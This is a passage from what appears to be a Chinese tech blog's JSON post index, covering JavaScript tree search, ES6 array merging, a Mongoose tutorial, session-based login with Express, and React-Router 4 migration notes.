&#123; id: 5, name: 'e', children: null, &#125;, &#123; id: 6, name: 'f', children: null, &#125;, ], &#125;, &#123; id: 4, name: 'd', children: null, &#125;, ]&#125;; 这是一道非二叉树的搜索，对节点进行深度搜索： 12345678910111213141516171819202122232425262728293031323334353637// 深度搜索，递归const findNode = (function () &#123; let node = null; const _findNode = (data, id) =&gt; &#123; // node === null 搜索到就不再继续搜索 if (data.id === id &amp;&amp; node === null) &#123; node = data; &#125; else if (Array.isArray(data.children) &amp;&amp; node === null) &#123; data.children.map(i =&gt; _findNode(i, id)); &#125; &#125;; return (data, id) =&gt; &#123; // 清零，重置 if(node !== null) node = null; // _findNode 返回 undefined，返回的其实是 node 的值 return _findNode(data, id) || node; &#125;;&#125;)();console.log(findNode(data, 6));// &#123; id: 6, name: 'f', children: null &#125;console.log(findNode(data, 7));// nullconsole.log(findNode(data, 3));/*&#123; id: 3, name: 'c', children: [ &#123; id: 5, name: 'e', children: null &#125;, &#123; id: 6, name: 'f', children: null &#125;, ],&#125;*/","categories":[{"name":"面试","slug":"面试","permalink":"http://me.lizhooh.com/categories/面试/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"面试","slug":"面试","permalink":"http://me.lizhooh.com/tags/面试/"}]},{"title":"ES6 一行代码实现多数组合并","slug":"ECMAScript/ES6 一行代码实现 多数组合并","date":"2017-04-11T08:59:11.000Z","updated":"2021-06-15T06:10:52.810Z","comments":true,"path":"/stories/2017/04/ECMAScript/ES6 一行代码实现 多数组合并/","link":"","permalink":"http://me.lizhooh.com/stories/2017/04/ECMAScript/ES6 一行代码实现 多数组合并/","excerpt":"多数组合并今天无聊的时刻突然来了灵感，使用 ES6 一行代码就实现了多数组合并的功能。 其中用到了Array.reduce","text":"多数组合并今天无聊的时刻突然来了灵感，使用 ES6 一行代码就实现了多数组合并的功能。 其中用到了Array.reduce 先来看看它的使用： arr.reduce([callback, initialValue]) 描述reduce为数组中的每一个元素依次执行回调函数，不包括数组中被删除或从未被赋值的元素，接受四个参数： previousValu 上一次值 currentValue 当前值 currentIndex 当前值的索引 array 数组 参数 callback 执行数组中每个值的函数，包含四个参数: previousValue 上一次调用回调函数返回的值，或者是提供的初始值（initialValue） currentValue 数组中当前被处理的元素 currentIndex 当前被处理元素在数组中的索引, 即currentValue的索引.如果有initialValue初始值, 从0开始.如果没有从1开始. array 调用 reduce 的数组 initialValue 可选参数, 作为第一次调用 callback 的第一个参数。 返回值 最后一次调用回调函数返回的结果 核心代码1const cat = (...arg) =&gt; arg.reduce((acc, cur) =&gt; [...acc, ...cur], []); 它是怎样执行的？最重要的数利用了 ES6 的函数参数的解构，展开表达式，reduce函数，箭头函数等知识。 在上面的代码里： 1234567// ...arg 是一个参数列表arg = [ [1, 2], [3], [4, 5], [6, 7, 8],]; 它的执行结果： 12345678// 第一次执行acc = [...[], ...[1, 2]]; // =&gt; [1, 2]// 第二次执行acc = [...[1, 2], ...[3]]; // =&gt; [1, 2, 3]// 第三次执行acc = [...[1, 2, 3], ...[4, 5]]; // =&gt; [1, 2, 3, 4, 5]// ...","categories":[{"name":"ES6","slug":"ES6","permalink":"http://me.lizhooh.com/categories/ES6/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"ES6(ES2015)","slug":"ES6-ES2015","permalink":"http://me.lizhooh.com/tags/ES6-ES2015/"}]},{"title":"学习 Mongoose 的使用","slug":"MongoDB/学习 Mongoose 的使用","date":"2017-04-08T15:31:28.000Z","updated":"2021-06-15T06:10:52.828Z","comments":true,"path":"/stories/2017/04/MongoDB/学习 Mongoose 的使用/","link":"","permalink":"http://me.lizhooh.com/stories/2017/04/MongoDB/学习 Mongoose 的使用/","excerpt":"MongooseMongoose 是 MongoDB 的在 Nodejs 上的一个第三方客户端。 Mongoose 提供了一个简单的，基于模式的解决方案来建模您的应用程序数据。它包括内置的类型转换，验证，查询构建，业务逻辑钩子等。","text":"MongooseMongoose 是 MongoDB 的在 Nodejs 上的一个第三方客户端。 Mongoose 提供了一个简单的，基于模式的解决方案来建模您的应用程序数据。它包括内置的类型转换，验证，查询构建，业务逻辑钩子等。 安装1npm install --save mongoose 如果需要使用 Promise，先设置 Promise 1mongoose.Promise = Promise; 连接数据库mongoose 连接数据库有很多种方式，这里列出两种。 mongoose.connect(url): DB 12345678910111213const mongoose = require('mongoose');// 无认证mongoose.connect('mongodb://ip:port/test', &#123; useMongoClient: true, // mongoose v4.0+&#125;);// 认证mongoose.connect('mongodb://user:password@ip:port/test', &#123; useMongoClient: true,&#125;);// mongoose.connect('mongodb://username:password@host:port/database?options...');const db = mongoose.connection; 12345const mongoose = require('mongoose');// 它的返回值是连接后的数据库对象const db = mongoose.connect('mongodb://ip:port/test', &#123; useMongoClient: true,&#125;); Mongoose 的几个大版本的连接方式都有所不同，这里的是 v4.x 的连接方式。其他具体看官方文档。 模型名词解释 Schema： 一种以文件形式存储的数据库模型骨架，不具备数据库的操作能力，是一种数据类型的约束。 Model： 由 Schema 发布生成的模型，具有抽象属性和行为的数据库操作对，可以看成是某类东西。 Entity： 由 Model 创建的实例，他的操作也会影响数据库，可以看成是类的实例。 创建模型123456789101112// 会自动创建/寻找 cats 集合mongoose.model('cat', new mongoose.Schema(&#123; name: String, // 约束 cats 集合的 name 键为 String 类型&#125;, &#123; versionKey: false // 去除自动添加版本号的键值，不然会自动添加 __v: 0&#125;));// 也可以手动的指定集合，第三个参数指定集合名称// mongoose.model('cat', schema, 'cat');// 获得模型的引用const Cat = mongoose.model('cat'); 也可以在创建时获得引用： 123456const Cat = mongoose.model('cat', new mongoose.Schema(&#123; name: String, // 约束 cats 集合的 name 键为 String 类型 _id: Number,&#125;, &#123; versionKey: false // 去除自动添加版本号的键值。&#125;)); 模型类型MongoDB 的文档数据是无限制类型的，为了更好的处理数据，mongoose 使用Schema进行类型的约束。当插入，与约束类型不匹配时，会插入失败。 123456789101112131415161718192021222324252627282930313233var blogSchema = new Schema(&#123; title: String, author: &#123; type: String, required: true, // 必填 unique: true, // 唯一性 &#125;, body: String, comments: [&#123; // 评论是一个数组 body: String, date: Date &#125;], date: &#123; type: Date, // 类型 default: Date.now // 默认值 &#125;, hidden: Boolean, meta: &#123; votes: Number, favs: Number&#125;, user: &#123; age: &#123; type: Number, min: 18, // 年龄的最少值 max: 65 &#125;, name: &#123; type: String, required: true // 不能为空 &#125;, addr: [String], // 字符串数组 &#125;, other: Other, // 引用其他 schema test: Other.tree.test, // 引用其他 schema 属性&#125;); Schema 的第二个参数是配置项，它有以下属性： 属性 默认值 描述 autoIndex true 自动建立索引。 capped 16M 最大文档大小。 collection 集合名称，默认情况下 mongoose 会使用名称的复数形式。 emitIndexErrors 发出“索引”事件。 id ObjectId 模型实例的 id。 new mongoose.Types.ObjectId() _id ObjectId 与 id 一样，作为存储进 MongoDB 里的 _id 里。 minimize true 是否删除空字段。 read false 允许在架构级别设置查询＃读取选项。 safe false 这个选项通过所有操作传递给 MongoDB，并指定是否应该将错误返回给我们的回调以及调整写入行为。 shardKey shardKey 当我们有一个分片的 MongoDB 架构时使用这个选项。 strict true strict 选项（默认启用）确保传递给我们模型构造函数的值在我们的模式中没有被指定，不会被保存到数据库中。 toJSON function 返回模型实例的 JSON 格式。 toObject function 返回模型实例的 Object 格式。 typeKey true 默认情况下，如果在模式中有一个带有“type”键的对象，mongoose会将其解释为类型声明。 validateBeforeSave true 默认情况下，文档在被保存到数据库之前会自动进行检验。 versionKey “0” versionKey 是在 mongoose 首次创建时在每个文档上设置的属性。该键值包含 文档的内部 修订版本。 collation true 为每个查询和聚合设置一个默认的排序规则。 skipVersioning false skipVersioning 允许从版本控制中排除路径。 timestamps false 如果设置 timestamps，mongoose 将添加 createdAt 和 updatedAt 字段到你的模型里。 retainKeyOrder 在 mongoose4，update() 和 findOneAndUpdate() 只检查顶层架构的严格模式设置。 注意的地方： 如果设置了 unique 就代表字段是唯一的，如果插入相同的会报错。 如果设置了 required 就代表是必填字段，如果留空会报错。 如果类型定义为 []，在插入时没有使用数组，这时不会报错，mongoose 会把插入的数组当作数组的一项放进数组，最后在 mongod 看到的是数组。 如果没有给定默认值，在插入时没有对应的字段，最后在 mongodb 里是没有对应字段的。 默认情况下，在类型为 [{ name: String }]，类似的子文档， mongoose 它会添加 _id。 1234[&#123; name: 'a', _id: '...',&#125;] 如果在数组里不需要 _id，可以使用 _id: false 去掉。 123user: [new Schema(&#123; name: String,&#125;, &#123; _id: false &#125;)] 在默认的情况下 mongoose 会删除空属性值以尽量的节省空间，可以使用 { minimize: false } 来去除。 如果设置 timestamps，mongoose 将添加 createdAt 和 updatedAt 字段到你的模型里。 模型检验当使用 Schema 定义模型时，可以使用 type 属性来指定模型字段类型。指定模型字段类型之后，在插入数据时 mongoose 会对数据进行检验。 对于检验，它有几个原则： 检验在 SchemaType 中定义。 检验是中间件。Mongoose pre(‘save’) 默认将检验注册为每个模式的钩子。 您可以使用 doc.validate(callback) 或手动运行检验 doc.validateSync()。 检验器不在未定义的值上运行。唯一的例外是 required 检验器。 检验是异步递归的; 当您调用 Model.save 时，也会执行子文档检验。如果发生错误，您的 Model.save 回调会收到它。 检验是可自定义的。 内置的检验器mongoose 里内置了几个检验器。 所有 SchemaTypes 都有内置的必需检验器。所需的检验器使用 SchemaType 的 checkRequired() 函数来确定该值是否满足所需的检验器。 Number 有 min 和 max 的检验器。 String 有 enum，match，maxLength 和 minLength 检验器。 12345678910111213141516171819202122232425const breakfastSchema = new Schema(&#123; eggs: &#123; type: Number, min: [6, 'Too few eggs'], // 最小是 6，错误信息为 'Too ...' max: 12 &#125;, bacon: &#123; type: Number, required: [true, 'Why no bacon?'] &#125;, drink: &#123; type: String, enum: ['Coffee', 'Tea'], // 枚举范围 required: function () &#123; return this.bacon &gt; 3; &#125; &#125;, color: &#123; type: String, enum: &#123; values: ['blue', 'yellow', 'green', 'red'], message: 'color error' // 错误信息 &#125; &#125;&#125;); 自定义检验器如果内置的验证器不够用，你可以定义自定义的检验器来满足你的需求。 123456789101112const userSchema = new Schema(&#123; phone: &#123; type: String, validate: &#123; validator: function (v) &#123; return /\\d&#123;3&#125;-\\d&#123;3&#125;-\\d&#123;4&#125;/.test(v); &#125;, message: '&#123;VALUE&#125; is not a valid phone number!' &#125;, required: [true, 'User phone number required'] &#125;&#125;); 当发生错误时，有几个可用的信息： {PATH} 被替换为无效的文档路径。 {VALUE} 被替换为无效值。 {TYPE} 被替换为诸如“正则表达式”，“最小”或“用户定义”的验证器类型。 {MIN} 用 Number.min 验证器的声明最小值替换。 {MAX} 被 Number.max 验证器声明的最大值替换。 创建实例创建实例也就是创建Entity，需要用到数据。 12// 根据模型，创建一个\"黑猫\"const blackCat = new Cat(&#123; name: '黑猫', _id: 1 &#125;); 模型、实例方法可以在创建Schema时添加，实例的方法。 12345678910111213141516171819202122const catSchema = mongoose.Schema(&#123; name: String,&#125;);// 根据模型，创建一个\"黑猫\"const blackCat = new Cat(&#123; name: '黑猫', _id: 1 &#125;);// 实例方法catSchema.methods.say = () =&gt; &#123; console.log(this.name, ': 喵喵喵');&#125;;// 静态方法catSchema.statics.says = () =&gt; &#123; console.log('喵喵喵');&#125;;// 这样就可以在实例里使用了blackCat.say(); // 黑猫：喵喵喵// 静态方法，需要使用模型名Cat.says(); // 喵喵喵 CRUD 增加、查询、更新和删除CRUD 分为Model与Entity的 CRUD。 增加相当于 insert 操作，注意确保数据的唯一性，插入相同的会报错，特别是_id自定义的时候。如果在，插入时缺少字段，就会报错： 1Error: document must have an name before saving create: 使用 Model 来操作 12345678910Cat.create(&#123; name: '花猫', _id: 2 &#125;, (err, result) =&gt; &#123; console.log(result); // &#123; name: '花猫', _id: 2 &#125;&#125;);// 当然也可以使用 PromiseCat.create(&#123; name: '花猫', _id: 2 &#125;).then(result =&gt; &#123; console.log(result); // &#123; name: '花猫', _id: 2 &#125;&#125;); save: 使用 Entity 来操作 123456789101112const whitecat = new Cat(&#123; name: '白猫', _id: 3 &#125;);whitecat.save((err, result) =&gt; &#123; console.log(result); // &#123; name: '白猫', _id: 3 &#125;&#125;);// 当然也可以使用 Promisewhitecat.save().then(result =&gt; &#123; console.log(result); // &#123; name: '白猫', _id: 3 &#125;&#125;); 还可以，修改再保存，注意下面的细节差异。 1234567891011121314151617181920const huacat = new Cat(&#123; name: '花猫', _id: 4 &#125;);huacat.save((err, result) =&gt; &#123; console.log(result); huacat.name = '神猫'; huacat.save((err, result) =&gt; &#123; console.log(result); &#125;);&#125;);// &#123; name: '花猫', _id: 4 &#125;// &#123; name: '神猫', _id: 4 &#125;const huacat2 = new Cat(&#123; name: '花猫', _id: 4 &#125;);// 报错， _id 重复huacat2.save((err, result) =&gt; &#123; console.log(result);&#125;); 批量增加12345678910Cat.create([ &#123; name: '花猫', _id: 5 &#125;, &#123; name: '神猫', _id: 6 &#125;,]).then(result =&gt; &#123; console.log(result); // [ // &#123; name: '花猫', _id: 5 &#125;, // &#123; name: '神猫', _id: 6 &#125; // ]&#125;); 更新有许多方式来更新文件，以下是常用的传统方式。 findById + save 1234Cat.findById(1, (err, cat) =&gt; &#123; cat.name = '新花猫'; cat.save(); // &#123; _id: 1, name: '新花猫' &#125;&#125;); findById + update 12345678910// 注意，在 MongoDB 里是不允许修改 _id，所以要把 _id deleteconst id = 1;Cat.findById(id, (err, cat) =&gt; &#123; cat.name = '旧花猫'; delete cat._id; Cat.update(&#123; _id: id &#125;, &#123; $set: cat &#125;).then(result =&gt; &#123; console.log(result); // &#123; ok: 1, nModified: 1, n: 1 &#125; &#125;);&#125;); update(query, date, option, callback) 和 mongodb 的 update 语法差不多 123456789101112131415161718// 这样只会更新第一个匹配Cat.update( &#123; name: '花猫' &#125;, &#123; $set: &#123; name: '新花猫' &#125; &#125;).then(result =&gt; &#123; console.log(result); // &#123; ok: 1, nModified: 1, n: 1 &#125;&#125;);// 更新所有匹配项Cat.update( &#123; name: '花猫' &#125;, &#123; $set: &#123; name: '新花猫' &#125; &#125;, &#123; multi: true &#125;).then(result =&gt; &#123; console.log(result); // &#123; ok: 1, nModified: 2, n: 2 &#125;&#125;); findByIdAndUpdate 12345const id = 1;Cat.findByIdAndUpdate(id, &#123; $set: &#123; name: '新花猫' &#125; &#125;).then(cat =&gt; &#123; console.log(cat); // &#123; _id: 1, name: '旧花猫' &#125; 返回的是查询到的值&#125;); 删除和新增一样，删除也有 2 种方式，但 Entity 和 Model 都使用 remove 方法。 remove: 使用 Model 来操作 1234Cat.remove(&#123; _id: 1 &#125;).then(comman =&gt; comman.result).then(result =&gt; &#123; console.log(result); // &#123; ok: 1, n: 1 &#125; n = 1 才表示删除成功&#125;); remove: 使用 Entity 来操作 12345678910const whitecat = new Cat(&#123; name: '白猫', _id: 1 &#125;);// 先添加, 10 秒后再删除whitecat.save().then(result =&gt; &#123; setTimeout(() =&gt; &#123; whitecat.remove().then(cat =&gt; &#123; console.log(cat); // &#123; name: '白猫', _id: 1 &#125; &#125;); &#125;, 1000 * 10);&#125;); findByIdAndRemove 12345const id = 2;Cat.findByIdAndRemove(id).then(cat =&gt; &#123; console.log(cat); // &#123; _id: 2, name: '新花猫' &#125; cat 不为 null 表示删除成功&#125;); 查询查询都是对 Model，进行操作，没有 Entity 的事。查询有两种方式：直接查询,链式查询。 直接查询12345678910Cat.find(&#123; name: '白猫' &#125;, &#123; _id: 0 &#125;, (err, result) =&gt; &#123; console.log(result); // [ &#123; name: '白猫' &#125; ]&#125;);// 或者使用 PromiseCat.find(&#123; name: '白猫' &#125;).then(result =&gt; &#123; console.log(result); // [ &#123; _id: 1, name: '白猫' &#125; ]&#125;); 还可以使用正则，多项查询： 123Cat.find(&#123; name: /.*猫+/ &#125;).count().then(count =&gt; &#123; console.log(count); // 3, 表示有三只猫&#125;); 所有与查询模型相关的 API： Cat.find(); Cat.findById(); Cat.findByIdAndRemove(); Cat.findByIdAndUpdate(); Cat.findOne(); Cat.findOneAndRemove(); Cat.findOneAndUpdate(); 链式查询下面一段是典型的链式查询，最后需要调用exec(callback)来表示结束链式。 123456789Person .find(&#123; occupation: /host/ &#125;) .where('name.last').equals('Ghost') .where('age').gt(17).lt(66) .where('likes').in(['vaporizing', 'talking']) .limit(10) .sort('-occupation') .select('name occupation') .exec(callback); 猫示例： 12345678Cat.find(&#123; name: /.*猫$/ &#125;) .where('_id').gte(1).lt(3) // 1 &lt;= _id &lt; 3 .sort('-_id') // - 表示降序 // .exec() // 调用 then 时自动调用 exec .then(result =&gt; &#123; console.log(result); // [ &#123; _id: 2, name: '肥猫' &#125;, &#123; _id: 1, name: '白猫' &#125; ] &#125;); 虚拟属性虚拟属性是一个不插入 Mongodb 的属性，但是它可以在 Mongoose 模型的实例里使用。定义虚拟属性： 1234UserSchema.virtual('name') .get(function() &#123; return this.name.first + ' ' + this.name.last; &#125;); 虚拟属性定义时的 this 是指向模型实例的。 使用虚拟属性： 12345// 创建实例const user = new User(&#123; name: &#123; first: 'Li', last: 'Zhooh' &#125; &#125;);// 使用虚属性user.name; // Lizhooh 聚合框架聚合框架是 Mongodb 里的内容，它为你提供有用的工具。使用聚合框架可以对集合中的文档进行变换和组合。基本上可以使用多个构件创建一个管道（pipeline），用于对一连串的文档进行处理。 构件包括了： 筛选（filtering） 投射（projecting） 分组（grouping） 排序（sorting） 限制（limiting） 跳过（skipping） 例如我们可以利用集合通过所有 count 的累加和： 1234567Cat.aggregate([&#123; $group: &#123; sum: &#123; $sum: '$user_count' &#125;, &#125;&#125;]).then(res =&gt; &#123; console.log(res);&#125;); 具体这里不一一细数。 文件结构推荐的文件结构: mongoose-config.js 配置 MongoDB 的连接与配置项 12345678910111213const mongoose = require('mongoose');mongoose.Promise = Promise;mongoose.connect('mongodb://127.0.0.1/test', &#123; useMongoClient: true,&#125;);// 引入模型require('./model/user');require('./model/student');require('./model/teacher');module.exports = mongoose.connection; model 文件夹，放置一些模型结构 - model/user.js 1234567891011121314151617const mongoose = require('mongoose');const userScheme = new mongoose.Schema(&#123; name: &#123; type: String, trim: true, &#125;, age: &#123; type: Number, max: 120, min: 0, &#125;&#125;, &#123; versionKey: false &#125;);const User = mongoose.model('user', userScheme, 'user');module.exports = User; 最后在使用的文件里引用： 1234567const db = require('./mongoose-config');// const User = require('./model/user');const User = mongoose.model('user');User.create(&#123; name: '小明', age: 20 &#125;).then(result =&gt; &#123; console.log(result);&#125;); 参考资料 http://mongoosejs.com/docs/guide.html","categories":[{"name":"MongoDB","slug":"MongoDB","permalink":"http://me.lizhooh.com/categories/MongoDB/"}],"tags":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"数据库","slug":"数据库","permalink":"http://me.lizhooh.com/tags/数据库/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://me.lizhooh.com/tags/MongoDB/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"}]},{"title":"前端路由守护 与 后端用户认证","slug":"React/React/前端路由守护与后端用户认证","date":"2017-04-03T11:26:17.000Z","updated":"2021-06-15T06:10:52.880Z","comments":true,"path":"/stories/2017/04/React/React/前端路由守护与后端用户认证/","link":"","permalink":"http://me.lizhooh.com/stories/2017/04/React/React/前端路由守护与后端用户认证/","excerpt":"前端路由守护为了实现在未认证用户试图进入被保护页面时转跳到首页的功能，这里使用的是React-Router 4.0来设置前端路由守护。 一般来说，用户认证功能是这样的： 在未认证状态下访问，被保护的页面时，进行重定向到登录页面。 在认证状态下访问，被保护的页面时，进行正常的转到指定页面。","text":"前端路由守护为了实现在未认证用户试图进入被保护页面时转跳到首页的功能，这里使用的是React-Router 4.0来设置前端路由守护。 一般来说，用户认证功能是这样的： 在未认证状态下访问，被保护的页面时，进行重定向到登录页面。 在认证状态下访问，被保护的页面时，进行正常的转到指定页面。 对于React-Router 4.0来说，取消了onEnter的 API （在 v3 的时候是使用onEnter来实现的），而是使用另一种方式来实现。 对于 React Router 4.0 可以这样监听路由的改变。 12345import &#123; OnUpdate &#125; from 'rrc';&lt;OnUpdate call=&#123;e =&gt; &#123; // 路由改变时触发&#125;&#125; /&gt; 12345678&lt;Route path=\"/public\" component=&#123;Public&#125; /&gt;&lt;Route path=\"/login\" component=&#123;Login&#125; /&gt;&lt;Route path=\"/protected\" render=&#123;props =&gt; &#123; fakeAuth.isAuthenticated ? &lt;User &#123;...props&#125; /&gt; : &lt;Redirect to='/login' /&gt;&#125;&#125; /&gt; 上面的代码，当用户访问/protected时，如果没有通过认证验证，那么就会重定向到/login；如果通过认证验证，那么就会加载&lt;User&gt; 后端用户认证基于 session 和 cookie 的后端用户认证方法： 在登录页面输入用户名与密码，单击按钮登录，将会把用户名和密码传给 API 服务器，服务器通过验证后就会将当前用户名（惟一）加入 session.user 里，并返回登录状态信息。 在登录时会创建一个新的 session，并产生一个 sessionID，这个 sessionID 将会通过请求响应存储在浏览器cookie的sid里，下次（前端）发出请求时设置 cookie 携带这个字段，此时服务器通过 sid 映射到 sessionID 来找到存储中的 session 数据关联起来。 在已经登录过一次后，会维持一个会话状态（一般为 30 分钟），通过 sid 映射到 sessionID，来找到 session.user 中的数据从而判断，用户是否登录过。如果发现会话生命周期结束了，那就把 session.user 置空或删除，并返回超时登录页面。 在注销时，也是通过 sid 来找到 session.user 信息，然后把 session.user 置空或删除。 自定义 session 中间件下面在 Nodejs 里，根据上面的方法，自定义一个简单的 session 中间件。 123456789101112131415161718192021222324252627282930313233343536373839// 唯一 IDconst uuid = require('uuid');// 储存 session 的信息const STROE = [];const session = (req, res, next) =&gt; &#123; const sid = req.cookie.sid; let _session = &#123; user: null, sessionID: null &#125;; if (sid) &#123; // 如果存在 sid 着寻找 session 信息 const index = STROE.find(i =&gt; i.sessionID === sid); index &gt;= 0 &amp;&amp; (_session = STROE[index]); &#125; req.session = &#123; ..._session, create(user) &#123; // 添加 session 信息 const sessionID = uuid.v4(); this.user = user; this.sessionID = sessionID; // 添加到 cookie 里 req.cookie.sid = sessionID; STROE.push(&#123; user, sessionID &#125;); &#125;, destroy() &#123; // 删除 session 信息 const index = STROE.find(i =&gt; i.sessionID === this.sessionID); this.user = null; this.sessionID = null; STROE.splice(index, 1); &#125;, &#125;; next();&#125;;module.exports = session; 相关的认证操作： 123456789101112131415161718// 开始登录router.get('/login', (req, res) =&gt; &#123; const user = &#123; name: req.query.name &#125;; // 在设置 session 前，检验账号密码 req.session.create(user); res.json(user);&#125;);// 登录状态router.get('/loadAuth', (req, res) =&gt; &#123; res.send(req.session.user || &#123;&#125;);&#125;);// 退出登录router.get('/logout', (req, res) =&gt; &#123; req.session.destroy(); res.json(null);&#125;); express-sessionexpress-session 是 Express 官方提供的中间件，提供了很多健壮的功能。 https://github.com/expressjs/session 安装 1npm install --save express-session 使用一般的使用方法，更多的去参考 github 123456789app.use(session(&#123; secret: 'my session demo', // 用于签名 sessionID 的密钥 resave: false, // 用于强制保存 session，大多数情况下应该设置为空 saveUninitialized: false, // 用于强制保存未初始化的 session， // 如果设置为 false，新的 session 在被修改时才会生成。 cookie: &#123; // 设置 cookie 的信息 maxAge: 1000 * 60 * 30 // 30 min &#125;&#125;)); 相关的认证操作： 123456789101112131415161718// 开始登录router.post('/login', (req, res) =&gt; &#123; const user = &#123; name: req.body.name &#125;; // 在设置 session 前，检验账号密码 req.session.user = user; res.json(user);&#125;);// 登录状态router.get('/loadAuth', (req, res) =&gt; &#123; res.send(req.session.user || &#123;&#125;);&#125;);// 退出登录router.get('/logout', (req, res) =&gt; &#123; req.session.destroy(_ =&gt; req.session = null); res.json(null);&#125;); 注意： 关于设置 cookie sid，匹配 sid 与 sessionID，找出 session 信息，这些Express-Session都帮你自动完成了，你只需要使用req.session就可以了。","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"快速学习 React-Router 4.0","slug":"React/Router/快速学习 React-Router 4.0","date":"2017-04-02T15:16:12.000Z","updated":"2021-06-15T06:10:52.883Z","comments":true,"path":"/stories/2017/04/React/Router/快速学习 React-Router 4.0/","link":"","permalink":"http://me.lizhooh.com/stories/2017/04/React/Router/快速学习 React-Router 4.0/","excerpt":"新机制React-Router 4.0相比之前的React-Router 3.0来说 API 变了不少啊，为了快速的从 v3 过渡到 v4。下面以已经学会了v3为前提，通过类比的方法快速学习React-Router 4.0","text":"新机制React-Router 4.0相比之前的React-Router 3.0来说 API 变了不少啊，为了快速的从 v3 过渡到 v4。下面以已经学会了v3为前提，通过类比的方法快速学习React-Router 4.0 基本使用的不同 在 v3 的时候一般是这样写的： 123456&lt;Router history=&#123;hashHistory&#125; &gt; &lt;Route path='/' component=&#123;Home&#125;&gt; &lt;Route path='/about' component=&#123;About&#125;&gt;&lt;/Route&gt; &lt;Route path='/topics' component=&#123;Topics&#125;&gt;&lt;/Route&gt; &lt;/Route&gt;&lt;/Router&gt; 在 v4 里变成这样： 123456import React from 'react'import &#123; BrowserRouter, Route, Link&#125; from 'react-router-dom' 123456789101112131415&lt;BrowserRouter&gt; &lt;div&gt; &lt;ul&gt; &lt;li&gt;&lt;Link to=\"/\"&gt;首页&lt;/Link&gt;&lt;/li&gt; &lt;li&gt;&lt;Link to=\"/about\"&gt;关于&lt;/Link&gt;&lt;/li&gt; &lt;li&gt;&lt;Link to=\"/topics\"&gt;主题列表&lt;/Link&gt;&lt;/li&gt; &lt;/ul&gt; &lt;hr /&gt; &lt;Route exact path=\"/\" component=&#123;Home&#125; /&gt; &lt;Route path=\"/about\" component=&#123;About&#125; /&gt; &lt;Route path=\"/topics\" component=&#123;Topics&#125; /&gt; &lt;/div&gt;&lt;/BrowserRouter&gt; 其中，&lt;Route&gt;也可以这样写，手动注入match（包含路由相关的属性） 123&lt;Route&gt; &lt;Topics match=&#123;&#123; params: &#123; id: 0 &#125;, url: '/topics' &#125;&#125; /&gt;&lt;/Route&gt; 主要的变化： 结构上，v4 更友好的体验和组件的思想，Route更像是一个容器。并不像 v3 那样死板。 props 上的变化，v3 props.router 变成了 v4 的是props.match 12345// v3this.props.router.params.id;// v4this.props.match.params.id; 嵌套路由的不同v4 整个设计的机制不同 v3 的嵌套路由 12345678910111213const home = () =&gt; ( &lt;div&gt; &lt;h2&gt;Hello home&lt;/h2&gt; &#123;this.props.children&#125; &lt;/div&gt;);&lt;Router history=&#123;hashHistory&#125; &gt; &lt;Route path='/' component=&#123;Home&#125;&gt; &lt;Route path='/about' component=&#123;About&#125;&gt;&lt;/Route&gt; &lt;Route path='/topics' component=&#123;Topics&#125;&gt;&lt;/Route&gt; &lt;/Route&gt;&lt;/Router&gt; v4 的嵌套路由 123456789101112131415161718192021222324&lt;BrowserRouter&gt; &lt;div&gt; &lt;ul&gt; &lt;li&gt;&lt;Link to=\"/\"&gt;首页&lt;/Link&gt;&lt;/li&gt; &lt;li&gt;&lt;Link to=\"/about\"&gt;关于&lt;/Link&gt;&lt;/li&gt; &lt;li&gt;&lt;Link to=\"/topics\"&gt;主题列表&lt;/Link&gt;&lt;/li&gt; &lt;/ul&gt; &lt;hr /&gt; &lt;Route exact path=\"/\" component=&#123;Home&#125; /&gt; &lt;Route path=\"/about\" component=&#123;About&#125; /&gt; &lt;Route path=\"/topics\" component=&#123;Topics&#125; /&gt; &lt;/div&gt;&lt;/BrowserRouter&gt;const Topics = (&#123; match &#125;) =&gt; ( &lt;div&gt; &lt;Route path=&#123;`$&#123;match.url&#125;/:topicId`&#125; component=&#123;Topic&#125; /&gt; &lt;Route exact path=&#123;match.url&#125; render=&#123;() =&gt; ( &lt;h3&gt;请选择一个主题。&lt;/h3&gt; )&#125; /&gt; &lt;/div&gt;) 注意：exact的作用是完全匹配。 主要的变化： v3 需要使用{this.props.children}来指定子路由页面的存放位置，而 v4 则可以在组件里使用&lt;Route&gt;（容器）来指定子路由，这看起来更清晰了。 v3 受{this.props.children}的限制只能在某个地方放置子路由页面的位置，而 v4 可以在多个地方放置&lt;Route&gt;（容器）来指定不同的路由。 默认路由的不同主要的不同，是在 v4 里废除了一些 API。 v3 的默认路由 1234&lt;Route path=\"/\" component=&#123;App&#125;&gt; &lt;IndexRoute component=&#123;Home&#125; /&gt; &lt;Route path=\"accounts\" component=&#123;Accounts&#125; /&gt;&lt;/Route&gt; v4 的默认路由 1234567891011&lt;BrowserRouter&gt; &lt;Route path=\"/topics\" component=&#123;Topics&#125; /&gt;&lt;/BrowserRouter&gt;const Topics = (&#123; match &#125;) =&gt; ( &lt;div&gt; &#123;/* 这里就默认路由，注意需要添加 exact=&#123;true&#125; 表示精准配置，这里配置到了 /topics */&#125; &lt;Route exact path=&#123;match.url&#125; component=&#123;Default&#125; /&gt; &lt;Route path=&#123;`$&#123;match.url&#125;/:topicId`&#125; component=&#123;Topic&#125; /&gt; &lt;/div&gt;) 主要的变化： v3 里使用&lt;IndexRoute&gt;来指定默认路由，而在 v4 里找不到这个 API，而是 使用&lt;Route exact path={match.url} /&gt;的方式来指定默认路由 exact={true}指的是完全精确的匹配 未匹配 404有时候，可以需要一种类似 404 路由效果，在 v3 里一般都是使用&lt;IndexRedirect&gt;（默认重定向）来解决，而 v4 里找不到这个 API。 v3 的 404 123456&lt;Route path=\"/\" component=&#123;App&#125;&gt; &#123;/* 